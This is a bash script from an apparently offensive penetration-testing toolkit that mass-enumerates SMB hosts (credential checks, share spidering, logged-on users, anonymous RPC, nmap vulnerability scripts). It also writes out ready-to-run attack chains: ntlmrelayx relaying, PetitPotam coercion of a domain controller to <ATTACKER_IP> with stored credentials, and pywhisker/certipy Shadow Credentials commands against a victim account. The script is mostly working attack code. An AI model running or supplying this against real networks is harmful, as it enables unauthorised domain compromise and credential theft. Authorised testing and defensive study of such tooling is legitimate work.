#!/usr/bin/env bash
# enum-smb.sh — SMB enumeration dispatcher.
# Uses (when available): netexec/nxc, enum4linux-ng, smbclient, rpcclient, smbmap.
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$SCRIPT_DIR/_lib.sh"

parse_common_args "$@" || exit 1
log "smb: $(wc -l < "$TARGETS") targets -> $OUT"

# Strip ports — SMB tooling uses default 445/139
IPS=$(ips_only "$TARGETS")

# ---------- 1. NXC mass cred-check + share listing ----------
if have nxc || have netexec; then
    NXC=$(command -v nxc || command -v netexec)
    NXC_ARGS=()
    nxc_creds_array NXC_ARGS

    log "nxc smb (cred check + shares + pass-pol)"
    echo "$IPS" | "$NXC" smb - "${NXC_ARGS[@]}" --shares --pass-pol --users --groups \
        > "$OUT/nxc_smb_full.txt" 2>&1 || true

    # Spider readable shares (auth-only — much faster than unauth flailing)
    if [ -n "${ENUM_USER:-}" ]; then
        log "nxc smb --spider_plus (this can take a while)"
        echo "$IPS" | "$NXC" smb - "${NXC_ARGS[@]}" --spider_plus \
            > "$OUT/nxc_smb_spider.txt" 2>&1 || true
    fi

    log "nxc smb --sessions / --loggedon-users (admin-only)"
    echo "$IPS" | "$NXC" smb - "${NXC_ARGS[@]}" --sessions \
        > "$OUT/nxc_smb_sessions.txt" 2>&1 || true
    echo "$IPS" | "$NXC" smb - "${NXC_ARGS[@]}" --loggedon-users \
        > "$OUT/nxc_smb_loggedon.txt" 2>&1 || true
else
    miss "nxc/netexec not installed"
fi

# ---------- 2. enum4linux-ng per host ----------
if have enum4linux-ng; then
    log "enum4linux-ng per host (parallel=${ENUM_PARALLEL:-4})"
    run_e4l() {
        local ip="$1"
        local out_dir="$OUT/$ip"
        mkdir -p "$out_dir"
        local creds=()
        if [ -n "${ENUM_USER:-}" ] && [ -n "${ENUM_PASS:-}" ]; then
            creds=(-u "$ENUM_USER" -p "$ENUM_PASS")
        fi
        enum4linux-ng -A "${creds[@]}" -oJ "$out_dir/e4l" "$ip" \
            > "$out_dir/e4l.txt" 2>&1 || true
    }
    export -f run_e4l
    export OUT ENUM_USER ENUM_PASS
    echo "$IPS" | xargs_p -I{} bash -c 'run_e4l "$@"' _ {}
else
    miss "enum4linux-ng not installed (pip install enum4linux-ng)"
fi

# ---------- 3. smbmap (auth share enumeration) ----------
if have smbmap && [ -n "${ENUM_USER:-}" ]; then
    log "smbmap -H per host"
    run_smbmap() {
        local ip="$1"
        local creds=(-u "$ENUM_USER")
        [ -n "${ENUM_PASS:-}" ]   && creds+=(-p "$ENUM_PASS")
        [ -n "${ENUM_DOMAIN:-}" ] && creds+=(-d "$ENUM_DOMAIN")
        smbmap -H "$ip" "${creds[@]}" -R --depth 2 \
            > "$OUT/$ip/smbmap.txt" 2>&1 || true
    }
    export -f run_smbmap
    export OUT ENUM_USER ENUM_PASS ENUM_DOMAIN
    echo "$IPS" | xargs_p -I{} bash -c 'run_smbmap "$@"' _ {}
fi

# ---------- 4. SMB signing / dialect / null sessions (rpcclient) ----------
if have rpcclient; then
    log "rpcclient -U '' (anonymous probe)"
    run_rpc() {
        ip="$1"
        mkdir -p "$OUT/$ip"
        {
            echo "--- enumdomusers ---"
            rpcclient -U '' -N "$ip" -c 'enumdomusers' 2>/dev/null
            echo "--- enumdomgroups ---"
            rpcclient -U '' -N "$ip" -c 'enumdomgroups' 2>/dev/null
            echo "--- querydominfo ---"
            rpcclient -U '' -N "$ip" -c 'querydominfo' 2>/dev/null
            echo "--- srvinfo ---"
            rpcclient -U '' -N "$ip" -c 'srvinfo' 2>/dev/null
            echo "--- netshareenumall ---"
            rpcclient -U '' -N "$ip" -c 'netshareenumall' 2>/dev/null
        } > "$OUT/$ip/rpc_anon.txt" 2>&1
    }
    export -f run_rpc
    export OUT
    echo "$IPS" | xargs_p -I{} bash -c 'run_rpc "$@"' _ {}
fi

# ---------- 5. Vulnerability scan (nmap NSE) ----------
if have nmap; then
    log "nmap smb-vuln-* scripts (slower; runs once across all hosts)"
    nmap -Pn -p139,445 --script 'smb-vuln-*,smb-protocols,smb-security-mode,smb2-security-mode' \
         -iL <(echo "$IPS") -oA "$OUT/nmap-smb-vuln" \
         >/dev/null 2>&1 || true
fi

# ---------- 6. NTLM-relay viability + PetitPotam signal (iteration C.13) ----------
# Parse the nmap NSE output we already produced for `Message signing enabled`.
# Hosts with signing disabled OR not required are NTLM-relay candidates.
if [ -f "$OUT/nmap-smb-vuln.nmap" ]; then
    : > "$OUT/_relay_candidates.txt"
    # Use a private mktemp file rather than a fixed /tmp path. The previous
    # /tmp/relay_cand.tmp was symlink-attackable by any local user and raced
    # across concurrent enum-smb.sh runs (e.g. parallel auto-enum.sh
    # invocations against split target lists).
    _relay_tmp="$(mktemp)"
    trap '[ -n "${_relay_tmp:-}" ] && rm -f "$_relay_tmp"' EXIT
    awk -v out="$_relay_tmp" '
        /^Nmap scan report for/ { host = $NF; gsub(/[()]/, "", host) }
        /Message signing enabled but not required/ { print host >> out }
        /Message signing enabled: false/            { print host >> out }
    ' "$OUT/nmap-smb-vuln.nmap" 2>/dev/null
    if [ -s "$_relay_tmp" ]; then
        sort -u "$_relay_tmp" > "$OUT/_relay_candidates.txt"
        n=$(wc -l < "$OUT/_relay_candidates.txt")
        err "CRITICAL: $n SMB host(s) with signing disabled or not-required — NTLM-relay candidates in _relay_candidates.txt"
    fi
    rm -f "$_relay_tmp"
fi

# PetitPotam: probe MS-EFSRPC EfsRpcOpenFileRaw on a DC (or any host running
# the EFS RPC interface). The MS-EFSRPC SMB pipe is \pipe\lsarpc. We just
# enumerate whether the named pipe is reachable anonymously — actual coerce
# requires impacket's petitpotam.py (separate, deliberately not bundled here).
if have rpcclient && [ -n "${ENUM_DC_IP:-}" ]; then
    log "petitpotam signal — probe \\\\pipe\\lsarpc anonymous reachability on DC ${ENUM_DC_IP}"
    rpcclient -U '' -N "${ENUM_DC_IP}" -c 'enumprinters' \
        > "$OUT/_petitpotam_signal.txt" 2>&1 || true
    if grep -qiE 'NT_STATUS_ACCESS_DENIED|NT_STATUS_LOGON_FAILURE' "$OUT/_petitpotam_signal.txt"; then
        log "  lsarpc reachable but auth required — coerce may still work via authenticated relay chain"
    elif grep -qiE 'flags:|printers:' "$OUT/_petitpotam_signal.txt"; then
        err "CRITICAL: lsarpc anonymous reachable on DC — run impacket petitpotam.py / dfscoerce.py manually"
    fi
fi

# ---------- 7. PetitPotam / coercion next-step hints (D1.1) ----------
# Per ADR-004 D5: coerce probes are detection-only here. If petitpotam.py
# is installed AND we identified a lsarpc-reachable DC above, emit the EXACT
# follow-up command the operator would run (under their own scoping).
# Never auto-fires the coerce — that requires an attacker-controlled relay.
if [ -n "${ENUM_DC_IP:-}" ] && [ -s "$OUT/_relay_candidates.txt" ]; then
    relay_count=$(wc -l < "$OUT/_relay_candidates.txt")
    {
        echo "# PetitPotam coerce + NTLM relay chain (operator-opt-in only)"
        echo "# Pre-reqs:"
        echo "#   - $relay_count signing-disabled relay candidate(s) in _relay_candidates.txt"
        echo "#   - DC at ${ENUM_DC_IP} with reachable \\pipe\\lsarpc"
        echo "#   - You control the attacker IP <ATTACKER_IP>"
        echo "#"
        echo "# Step 1 (terminal A) — start ntlmrelayx against a signing-disabled target:"
        echo "#   impacket-ntlmrelayx -t smb://<RELAY_TARGET> -smb2support --no-http-server"
        echo "#"
        if have petitpotam.py; then
            echo "# Step 2 (terminal B) — coerce DC auth to ATTACKER_IP via PetitPotam:"
            echo "#   petitpotam.py -u '$ENUM_USER' -p '$ENUM_PASS' \\"
            echo "#                 -d '${ENUM_DOMAIN:-CORP.LOCAL}' \\"
            echo "#                 <ATTACKER_IP> ${ENUM_DC_IP}"
            echo "#   (also try: dfscoerce.py, coercer.py for fallback vectors)"
        else
            echo "# Step 2 (terminal B) — INSTALL petitpotam.py first:"
            echo "#   pipx install impacket   # provides petitpotam.py"
            echo "# Then coerce DC auth to ATTACKER_IP via PetitPotam (see impacket docs)."
        fi
    } > "$OUT/_petitpotam_hint.txt"
    err "HIGH: PetitPotam coerce chain available — see _petitpotam_hint.txt for the exact commands"
fi

# ---------- 8. Shadow Credentials viability hint (D1.1) ----------
# Shadow Credentials (msDS-KeyCredentialLink write) works when:
#   - LDAP signing is NOT required on the DC (or you have NTLM channel binding bypass)
#   - You have GenericWrite / WriteOwner on a target user/computer object
#   - Target functional level is 2016+ (KCD trust requires this)
# We can't determine all of that from SMB alone, but if the operator passes
# both --user and --dc-ip, the conditions are at least worth surfacing.
if [ -n "${ENUM_USER:-}" ] && [ -n "${ENUM_DC_IP:-}" ]; then
    {
        echo "# Shadow Credentials viability hint (operator follow-up via enum-ldap.sh)"
        echo "#"
        echo "# If you discover GenericWrite or WriteOwner on a target user/computer object"
        echo "# (BloodHound owned-objects path or 'nxc ldap --bloodhound'):"
        echo "#"
        echo "#   pywhisker --target <victim-user> -d '${ENUM_DOMAIN:-CORP.LOCAL}' \\"
        echo "#             -u '$ENUM_USER' -p '<PASS>' --dc-ip ${ENUM_DC_IP} \\"
        echo "#             --action add"
        echo "#   certipy account create -u '$ENUM_USER' -p '<PASS>' \\"
        echo "#             -d '${ENUM_DOMAIN:-CORP.LOCAL}' -dc-ip ${ENUM_DC_IP} \\"
        echo "#             -target <victim> -shadow"
        echo "#"
        echo "# Pre-requisite: msDS-KeyCredentialLink is writable on the target. Check via"
        echo "# enum-ldap.sh BloodHound output for inbound 'AddKeyCredentialLink' edges."
    } > "$OUT/_shadow_creds_hint.txt"
fi

log "smb dispatcher done."
